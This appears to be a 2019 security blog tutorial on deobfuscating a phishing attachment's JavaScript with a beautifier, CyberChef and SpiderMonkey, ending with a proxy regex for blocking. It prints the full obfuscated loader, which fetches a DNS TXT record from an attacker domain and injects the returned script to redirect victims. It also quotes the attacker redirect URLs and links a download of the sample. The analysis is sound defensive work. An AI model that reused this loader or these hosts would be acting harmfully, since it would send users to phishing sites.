---
layout: post
title: How to Deobfuscate JavaScript (JS)
date:   2019-06-16
description: It's a weekend and you ran out of things to do?  Why don't you try deobfuscating this malicious Javascript!

tags:
- REM
- JS
- Phishing

share: true
toc: true
---

---
![img]({{ '/assets/images/2019-06-16-HowToDeobfuscateJS/Image1.png' | relative_url }}){: .center-image }*Figure 1 - Obfuscated/Deobfucated JavaScript from a Phishing email*

---

# Introduction

Recently I came across an interesting phishing email.  The email contained a XML HTML attachment.  The HTML attachment contained a XML header with HTML markup and obfuscated JavaScript(JS) code.  

Figure 2 shows the phishing email [2].

![img]({{ '/assets/images/2019-06-16-HowToDeobfuscateJS/Image2.png' | relative_url }}){: .center-image }*Figure 2 - A Phishing Email with HTML Attachment [2]*

Figure 3 shows the code contained in the attachment.

![img]({{ '/assets/images/2019-06-16-HowToDeobfuscateJS/Image3.png' | relative_url }}){: .center-image }*Figure 3 - XML HTML File with Malicious JavaScript*

In this article we're going to analysis the HTML attachment.

# Instructions
Lets get started.  We're going to take a part the HTML attachment to see what each part does.  We'll need some tools to do this.

## Required Tools
Here are the tools you need:

* A Sandbox Lab (if you don't have one, then build [one](https://www.sharif.org/2019/04/HowToCreateAVM/))
* Didier Stevens's SpiderMonkey ([Link](https://blog.didierstevens.com/programs/spidermonkey/))

Upload the HTML attachment to your sandbox (Be Very Careful!).  You can get a copy [here](https://myonlinesecurity.co.uk/wp-content/uploads/2019/06/delivery-328.zip) (Usual Password)

To reduce the risk of accidental double clicking on the malicious attachments you can do the following:

> Re-associate .html extensions to open in notepad or your favorite hex editor.  This will reduce the chance of accidentally double clicking a malicious file while trying to transfer it to your sandbox. Why stop there?  Re-associate other high risk extensions (ex. .doc, .xls, .pdf, .vbs, .js) to open in Notepad too.  I may revisit this idea in another article.

## Lets Get Started
Here is the code contained in the malicious HTML attachment:

{% highlight XML linenos %}
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta content="" /><script type="text/javascript" xml:space="preserve">//<![CDATA[
    var v = window.atob("aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU");
    var _0x2b42=['0xc','open','GET','onreadystatechange','status','readyState','parse','responseText','createElement','script','innerHTML','substring','send','push','shift','0x0','0x1','0x2','0x3','0x4','0x5','0x6','0x7','data','0x8','0x9','0xa','0xb','length','body'];(function(_0x26248d,_0x33adc9){var _0x47fb3a=function(_0xb8f9b1){while(--_0xb8f9b1){_0x26248d['push'](_0x26248d['shift']());}};_0x47fb3a(++_0x33adc9);}(_0x2b42,0x97));var _0x58f7=function(_0x3aa2b9,_0x591490){_0x3aa2b9=_0x3aa2b9-0x0;var _0x2886d9=_0x2b42[_0x3aa2b9];return _0x2886d9;};function ccc(){var _0x3bf9f2=[_0x58f7('0x0'),_0x58f7('0x1'),_0x58f7('0x2'),_0x58f7('0x3'),_0x58f7('0x4'),_0x58f7('0x5'),_0x58f7('0x6'),'Answer',_0x58f7('0x7'),_0x58f7('0x8'),_0x58f7('0x9'),_0x58f7('0xa'),'appendChild',_0x58f7('0xb')];(function(_0x532510,_0x26a9cf){var _0x47b474=function(_0x5c32a3){while(--_0x5c32a3){_0x532510[_0x58f7('0xc')](_0x532510[_0x58f7('0xd')]());}};_0x47b474(++_0x26a9cf);}(_0x3bf9f2,0x1b2));var _0x58060d=function(_0x13b5d5,_0x174409){_0x13b5d5=_0x13b5d5-0x0;var _0x1aae1c=_0x3bf9f2[_0x13b5d5];return _0x1aae1c;};var _0x48f014=new XMLHttpRequest();_0x48f014[_0x58060d(_0x58f7('0xe'))](_0x58060d(_0x58f7('0xf')),v);_0x48f014[_0x58060d(_0x58f7('0x10'))]=function(){if(_0x48f014[_0x58060d(_0x58f7('0x11'))]==0xc8&&_0x48f014[_0x58060d(_0x58f7('0x12'))]==0x4){var _0x45edda=JSON[_0x58060d(_0x58f7('0x13'))](_0x48f014[_0x58060d(_0x58f7('0x14'))]);var _0x2e08f9=_0x45edda[_0x58060d(_0x58f7('0x15'))][0x0][_0x58f7('0x16')];var _0x599d3c=document[_0x58060d(_0x58f7('0x17'))](_0x58060d(_0x58f7('0x18')));_0x599d3c[_0x58060d(_0x58f7('0x19'))]=_0x2e08f9[_0x58060d(_0x58f7('0x1a'))](0x1,_0x2e08f9[_0x58f7('0x1b')]-0x1);document[_0x58f7('0x1c')][_0x58060d(_0x58f7('0x1d'))](_0x599d3c);}};_0x48f014[_0x58060d('0xd')]();}
    //]]>
    </script><script src="https://accounts.google.com/o/oauth2/revoke?callback=ccc()" type="text/javascript" xml:space="preserve"></script>
    <title></title>
</head>
<body>
    Loading...
</body>
</html>
{% endhighlight XML %}

Here are some of the things that stand out :

* Line 1 is the XML header
* Line 2 is defining an HTML XML Document
* Line 3 start of the HTML document
* Line 5 script tag containing JavaScript
* Line 5 also contains interesting code - xml:space="preserve">//<![CDATA[
* Line 6-7 JS code
* Line 8 interesting end for a JavaScript - //]]>
* Line 9 end of first script and started of second script
* Line 12-14 the HTML body that shows the message "Loading..."
* Line 15 end of the html - </html>


There are two script blocks in the attachment.  The first script block starts on Line 5 and it contains JavaScript code.  Line 5 contains some interesting code:

`xml:space="preserve">//<![CDATA[`

The first part `xml:space="preserve">` is at the end of the HTML script tag.  

Here is what it means [3]:

> The xml:space="preserve" directive says that space within element content is significant.

It's basically a XML parser instruction that specifies space is important.

The second part `//<![CDATA[` is the start of the JavaScript code. In JavaScript `//` denotes a comment.  

Here is what `<![CDATA[` means in XML [4]:

> The term CDATA means, Character Data. CDATA is defined as blocks of text that are not parsed by the parser, but are otherwise recognized as markup.
> ...
>
> Following is the syntax for CDATA section −
>
> ```
> <![CDATA[
>    characters with markup
> ]]>
> ```

The above also explains Line 8 of the attachment file.  `]]>` means it's the end of the CDATA section.  

This leaves line 6 and 7 that is the actual obfuscated JS code.  Lets take a closer look.

First, lets see if we can make the code more readable using a JS  beautifier.  There are many different websites online that provide this service.  On our sandbox, using the one [here](https://beautifier.io/) we beautify line 6 and 7.  Here is resulting code:

{% highlight JavaScript linenos %}
var v = window.atob("aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU");
var _0x2b42 = ['0xc', 'open', 'GET', 'onreadystatechange', 'status', 'readyState', 'parse', 'responseText', 'createElement', 'script', 'innerHTML', 'substring', 'send', 'push', 'shift', '0x0', '0x1', '0x2', '0x3', '0x4', '0x5', '0x6', '0x7', 'data', '0x8', '0x9', '0xa', '0xb', 'length', 'body'];
(function(_0x26248d, _0x33adc9) {
    var _0x47fb3a = function(_0xb8f9b1) {
        while (--_0xb8f9b1) {
            _0x26248d['push'](_0x26248d['shift']());
        }
    };
    _0x47fb3a(++_0x33adc9);
}(_0x2b42, 0x97));
var _0x58f7 = function(_0x3aa2b9, _0x591490) {
    _0x3aa2b9 = _0x3aa2b9 - 0x0;
    var _0x2886d9 = _0x2b42[_0x3aa2b9];
    return _0x2886d9;
};

function ccc() {
    var _0x3bf9f2 = [_0x58f7('0x0'), _0x58f7('0x1'), _0x58f7('0x2'), _0x58f7('0x3'), _0x58f7('0x4'), _0x58f7('0x5'), _0x58f7('0x6'), 'Answer', _0x58f7('0x7'), _0x58f7('0x8'), _0x58f7('0x9'), _0x58f7('0xa'), 'appendChild', _0x58f7('0xb')];
    (function(_0x532510, _0x26a9cf) {
        var _0x47b474 = function(_0x5c32a3) {
            while (--_0x5c32a3) {
                _0x532510[_0x58f7('0xc')](_0x532510[_0x58f7('0xd')]());
            }
        };
        _0x47b474(++_0x26a9cf);
    }(_0x3bf9f2, 0x1b2));
    var _0x58060d = function(_0x13b5d5, _0x174409) {
        _0x13b5d5 = _0x13b5d5 - 0x0;
        var _0x1aae1c = _0x3bf9f2[_0x13b5d5];
        return _0x1aae1c;
    };
    var _0x48f014 = new XMLHttpRequest();
    _0x48f014[_0x58060d(_0x58f7('0xe'))](_0x58060d(_0x58f7('0xf')), v);
    _0x48f014[_0x58060d(_0x58f7('0x10'))] = function() {
        if (_0x48f014[_0x58060d(_0x58f7('0x11'))] == 0xc8 && _0x48f014[_0x58060d(_0x58f7('0x12'))] == 0x4) {
            var _0x45edda = JSON[_0x58060d(_0x58f7('0x13'))](_0x48f014[_0x58060d(_0x58f7('0x14'))]);
            var _0x2e08f9 = _0x45edda[_0x58060d(_0x58f7('0x15'))][0x0][_0x58f7('0x16')];
            var _0x599d3c = document[_0x58060d(_0x58f7('0x17'))](_0x58060d(_0x58f7('0x18')));
            _0x599d3c[_0x58060d(_0x58f7('0x19'))] = _0x2e08f9[_0x58060d(_0x58f7('0x1a'))](0x1, _0x2e08f9[_0x58f7('0x1b')] - 0x1);
            document[_0x58f7('0x1c')][_0x58060d(_0x58f7('0x1d'))](_0x599d3c);
        }
    };
    _0x48f014[_0x58060d('0xd')]();
}
{% endhighlight JavaScript %}

Carefully save this script to a new malicious.js file on the sandbox for later.

The following lines jump out after a quick review:

1. Line 1 contains a BASE64 string
1. Line 2 an array of functions that are likely called in the code
1. Line 32 XMLHttpRequest

Using [CyberChef](https://gchq.github.io/CyberChef/) Line 1 is decoded to:

```
https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT
```

This is a URL for google's DNS lookup service.  More specifically it is doing a lookup for a TXT DNS record for subdomain fetch.slzxkcee.glamisbound.com.

Doing this lookup from the sandbox returns the following JSON response:

{% highlight JSON %}
{"Status": 0,"TC": false,"RD": true,"RA": true,"AD": false,"CD": false,
"Question":[ {"name": "fetch.slzxkcee.glamisbound.com.","type": 16}],
"Answer":[ {"name": "fetch.slzxkcee.glamisbound.com.",
"type": 16,"TTL": 119,
"data": "\"window.location.replace(\"http://www.67595bfg36abp.multiproinvest.com/80999.html\");\""}],
"Comment": "Response from 104.193.252.177."}
{% endhighlight JSON %}

Each time this lookup is done, the server responds with a different answer which contains a different URL.

The TTL is set to 119 seconds, which means the DNS servers will only cache the request for under 2 min.  

The data field contains JavaScript code and a URL.  Lets see what the Javascript code does [5]:

> The Location.replace() method replaces the current resource with the one at the provided URL. The difference from the assign() method is that after using replace() the current page will not be saved in session History, meaning the user won't be able to use the back button to navigate to it.


At this point we can make an educated guess what the original malicious attachment is doing.  It's probably doing a DNS TXT lookup to obtain the second malicious domain.  It then redirects the user to this domain.

However, to be sure we need to deobfuscate rest of the script.  Lets continue...

## JavaScript Deobfuscation

One of my favorite tools for JS deobfuscation is [SpiderMonkey](https://blog.didierstevens.com/programs/spidermonkey/) by Didier Stevens.

Here is what it does [6]:

> SpiderMonkey is a modified version of Mozilla’s C implementation of JavaScript, with some extra functions to help with malware analysis.
>
> Additional functionality:
>
> document.write
> eval(arg) writes arg to a file
> window.navigate

We're going to use `document.write` and SpiderMonkey to deobfuscate this script.

Going back to the original attaachment, Line 9 is shown here:

```
<script src="https://accounts.google.com/o/oauth2/revoke?callback=ccc()" type="text/javascript" xml:space="preserve"></script>
```

This line is a tricky way to call the `ccc()` function in the malicious.js.  We will need to call ccc() to simulate the original attachment.  This can be done but adding ccc() to the bottom of malicious.js.

Lets run the script in the sandbox with SpiderMonkey.  

Here is the error message I received.

```
PS C:\Users\User\desktop\windows > .\js-file .\malicious.js
.\malicious.js:1: TypeError: window.atob is not a function
```

You will see errors like this with SpiderMonkey.  As we're not running the JavaScript in a browser, we need to modify the code a little bit.

Here is what `windows.atob` does [7]:
> Decode a base-64 encoded string

Lets replace line 1 of .\malicious.js with the decoded value of the string.

{% highlight JavaScript linenos %}
var v = "https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT";
{% endhighlight JavaScript %}

Running the script again gives an error message about "XMLHttpRequest".  This is fine, we know that most of the script is running now.  There are no output or write.log to know what this script does.  

Beware at this point your VM may be infected.  Depending on what you're analyzing and whether the sandbox is connected to the internet or not, you may want to restart your Sandbox (from a clean snapshot).

Lets add some `document.write` to the script to figure out what the script is doing.  By adding these `document.write` and using SpiderMonkey, we can dump the obfuscated strings to 'write.log' file.  Using this method, we will be able to deobfuscate the script.

Here is some of the `document.write` that I added to the script (more specifically prior to the "XMLHttpRequest()" function):


{% highlight JavaScript linenos %}
document.write("XMLHttpRequest => "+ _0x58060d(_0x58f7('0xe')) + " " + (_0x58060d(_0x58f7('0xf')))  + " " + v  + " " + "\n");
document.write("_0x58060d(_0x58f7('0x10')): " +_0x58060d(_0x58f7('0x10'))+ "\n");
document.write("_0x58060d(_0x58f7('0x11')): " +_0x58060d(_0x58f7('0x11'))+ "\n");
document.write("_0x58060d(_0x58f7('0x12')): " +_0x58060d(_0x58f7('0x12'))+ "\n");
document.write("_0x58060d(_0x58f7('0x13')): " +_0x58060d(_0x58f7('0x13'))+ "\n");
document.write("_0x58060d(_0x58f7('0x14')): " +_0x58060d(_0x58f7('0x14'))+ "\n");
document.write("_0x58060d(_0x58f7('0x15')): " +_0x58060d(_0x58f7('0x15'))+ "\n");
document.write("_0x58f7('0x16')): " +(_0x58f7('0x16'))+ "\n");
document.write("_0x58060d(_0x58f7('0x17)): " +_0x58060d(_0x58f7('0x17'))+ "\n");
document.write("_0x58060d(_0x58f7('0x18')): " +_0x58060d(_0x58f7('0x18'))+ "\n");
document.write("_0x58060d(_0x58f7('0x19')): " +_0x58060d(_0x58f7('0x19'))+ "\n");
document.write("_0x58060d(_0x58f7('0x1a')): " +_0x58060d(_0x58f7('0x1a'))+ "\n");
document.write("_0x58f7('0x1b'): " + _0x58f7('0x1b')+ "\n");
document.write("_0x58f7('0x1c'): " + _0x58f7('0x1c')+ "\n");
document.write("_0x58060d(_0x58f7('0x1d')): " +_0x58060d(_0x58f7('0x1d'))+ "\n");
document.write("_0x58060d('0xd'): " + _0x58060d('0xd') );
{% endhighlight JavaScript %}

Here is the partial content of write.log after running the script with SpiderMonkey:

```
XMLHttpRequest => open GET https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT
_0x58f7: Input: 16,undefined, output:0x2
_0x58060d: Input: 2,undefined, output:onreadystatechange
_0x58060d(_0x58f7('0x10')): onreadystatechange
_0x58f7: Input: 17,undefined, output:0x3
_0x58060d: Input: 3,undefined, output:status
_0x58060d(_0x58f7('0x11')): status
_0x58f7: Input: 18,undefined, output:0x4
_0x58060d: Input: 4,undefined, output:readyState
_0x58060d(_0x58f7('0x12')): readyState
_0x58f7: Input: 19,undefined, output:0x5
_0x58060d: Input: 5,undefined, output:parse
_0x58060d(_0x58f7('0x13')): parse
_0x58f7: Input: 20,undefined, output:0x6
_0x58060d: Input: 6,undefined, output:responseText
_0x58060d(_0x58f7('0x14')): responseText
_0x58f7: Input: 21,undefined, output:0x7
_0x58060d: Input: 7,undefined, output:Answer
_0x58060d(_0x58f7('0x15')): Answer
_0x58f7: Input: 22,undefined, output:data
_0x58f7('0x16')): data
_0x58f7: Input: 23,undefined, output:0x8
_0x58060d: Input: 8,undefined, output:createElement
_0x58060d(_0x58f7('0x17)): createElement
_0x58f7: Input: 24,undefined, output:0x9
_0x58060d: Input: 9,undefined, output:script
_0x58060d(_0x58f7('0x18')): script
_0x58f7: Input: 25,undefined, output:0xa
_0x58060d: Input: 10,undefined, output:innerHTML
_0x58060d(_0x58f7('0x19')): innerHTML
_0x58f7: Input: 26,undefined, output:0xb
_0x58060d: Input: 11,undefined, output:substring
_0x58060d(_0x58f7('0x1a')): substring
_0x58f7: Input: 27,undefined, output:length
_0x58f7('0x1b'): length
_0x58f7: Input: 28,undefined, output:body
_0x58f7('0x1c'): c
_0x58f7: Input: 29,undefined, output:0xc
_0x58060d: Input: 12,undefined, output:appendChild
_0x58060d(_0x58f7('0x1d')): appendChild
_0x58060d: Input: 13,undefined, output:send
_0x58060d('0xd'): send

```

Replacing the obfuscated strings with the deobfuscate strings and renaming the variables gives the following:

{% highlight JavaScript linenos %}
var XMLHTTP = new XMLHttpRequest();
XMLHTTP[Open](Get), "https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT";
XMLHTTP[onreadystatechange] = function() {
    if (XMLHTTP[status] == 0xc8 && XMLHTTP[readyState] == 0x4) {
        var responseTextString = JSON[parse](XMLHTTP[responseText]);
        var dataString = responseTextString[Answer][0x0][data];
        var HTMLDocument = document[createElement](script);
        HTMLDocument[innerHTML] = dataString[substring](0x1, dataString[length] - 0x1);            
        document[length][appendChild](HTMLDocument);
    }
};

XMLHTTP[send]();
{% endhighlight JavaScript %}

This verifies our educated guess from earlier.

## Blocking the Script
There are different ways to block the script.  One way is to block the initial DNS lookup.  Another way is to block the second domain.  I looked at number of the DNS TXT responses and at the moment there seems to be a pattern in the responses.

The second domain can be blocked by a web proxy, using the following Regex:

```
\d{5}bfg36abp\..*\.\w{3}\/\d{5}\.html\\
```

# Conclusion
This article described how you can deobfucate a malicious JavaScript code.  The malware authors could have done better hiding the DNS lookup.  They used a simple BASE64 encoding to hide the lookup.  It's always enjoyable to deobfucate a script to see how it works.  If you have any comments/feedback, send them to me via twitter.


# References
[1] https://myonlinesecurity.co.uk/it-looks-like-another-dns-compromise-hack-happening/
[2] https://www.bleepingcomputer.com/news/security/new-spam-campaign-controlled-by-attackers-via-dns-txt-records/
[3] https://stackoverflow.com/questions/51464972/xmlspace-preserve-effect-on-space-between-xml-attributes
[4] https://www.tutorialspoint.com/xml/xml_cdata_sections.htm
[5] https://developer.mozilla.org/en-US/docs/Web/API/Location/replace
[6] [SpiderMonkey](https://blog.didierstevens.com/programs/spidermonkey/)
[7] https://www.w3schools.com/jsref/met_win_atob.asp
